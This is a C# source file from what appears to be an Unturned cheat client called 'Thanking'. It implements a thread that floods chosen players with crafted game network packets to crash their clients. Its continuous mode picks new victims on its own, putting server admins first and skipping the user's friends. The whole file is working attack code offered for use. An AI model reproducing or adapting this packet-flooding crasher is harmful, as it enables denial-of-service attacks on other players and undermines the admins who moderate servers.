﻿using System.Linq;
using System.Reflection;
using System.Threading;
using SDG.Unturned;
using Steamworks;    
using Thanking.Attributes;
 using Thanking.Options;
 using Thanking.Utilities;
using UnityEngine;

namespace Thanking.Threads
{
    public static class PlayerCrashThread
    {
        public static bool PlayerCrashEnabled;
        public static bool ContinuousPlayerCrash;
        public static CSteamID CrashTarget;
        
        [Thread]
        public static void Start()
        {
            Thread.Sleep(5000);
            #if DEBUG
			DebugUtilities.Log("Player Crash Thread Started");
			#endif
            Provider.onEnemyDisconnected += OnDisconnect;

            ResourceManager instance = (ResourceManager) typeof(ResourceManager)
                .GetField("manager", BindingFlags.NonPublic | BindingFlags.Static).GetValue(null);
            
            instance.channel.getPacket(ESteamPacket.UPDATE_UNRELIABLE_INSTANT,
                instance.channel.getCall("askResources"), out int S1, out byte[] P1, (byte)0, (byte)0);
            
            instance.channel.getPacket(ESteamPacket.UPDATE_UNRELIABLE_INSTANT,
                instance.channel.getCall("askResources"), out int S2, out byte[] P2, byte.MaxValue, byte.MaxValue);
            
            StructureManager.instance.channel.getPacket(ESteamPacket.UPDATE_UNRELIABLE_INSTANT,
                StructureManager.instance.channel.getCall("askStructures"), out int S3, out byte[] P3, (byte)0, (byte)0);
            
            ZombieManager.instance.channel.getPacket(ESteamPacket.UPDATE_UNRELIABLE_INSTANT,
                ZombieManager.instance.channel.getCall("askZombies"), out int S4, out byte[] P4, (byte)0, (byte)0);
            
            ItemManager.instance.channel.getPacket(ESteamPacket.UPDATE_UNRELIABLE_INSTANT,
                ItemManager.instance.channel.getCall("askZombies"), out int S5, out byte[] P5, (byte)0, (byte)0);
            
            while (true)
            {
                if (PlayerCrashEnabled)
                {
                    switch (MiscOptions.PCrashMethod)
                    {
                        case 0:
                            Provider.send(CrashTarget, ESteamPacket.UPDATE_UNRELIABLE_INSTANT, P1, S1, instance.channel.id);
                            break;
                        case 1:
                            Provider.send(CrashTarget, ESteamPacket.UPDATE_UNRELIABLE_INSTANT, P2, S2, instance.channel.id);
                            break;
                        case 2:
                            Provider.send(CrashTarget, ESteamPacket.UPDATE_UNRELIABLE_INSTANT, P3, S3, instance.channel.id);
                            break;
                        case 3:
                            Provider.send(CrashTarget, ESteamPacket.UPDATE_UNRELIABLE_INSTANT, P4, S4, instance.channel.id);
                            break;
                        case 4:
                            Provider.send(CrashTarget, ESteamPacket.UPDATE_UNRELIABLE_INSTANT, P5, S5, instance.channel.id);
                            break;
                    }
                }
                
                else
                {
                    Thread.Sleep(1000);
                    if (!ContinuousPlayerCrash || Provider.clients.Count == 0)
                        continue;

                    PlayerCrashEnabled = true;
                    Thread.Sleep(1000);
                    
                    CrashTarget = Provider.clients.OrderBy(p => p.isAdmin ? 0 : 1)
                        .First(p => !FriendUtilities.IsFriendly(p.player)).playerID.steamID;
                }
            }
        }

        public static void OnDisconnect(SteamPlayer player)
        {
            if (player.playerID.steamID == CrashTarget)
            {
                if (!ContinuousPlayerCrash)
                    PlayerCrashEnabled = false;
                
                else
                    CrashTarget = Provider.clients.OrderBy(p => p.isAdmin ? 0 : 1)
                        .First(p => p.playerID.steamID != CrashTarget && !FriendUtilities.IsFriendly(p.player)).playerID.steamID;
            }
        }  
    }
}
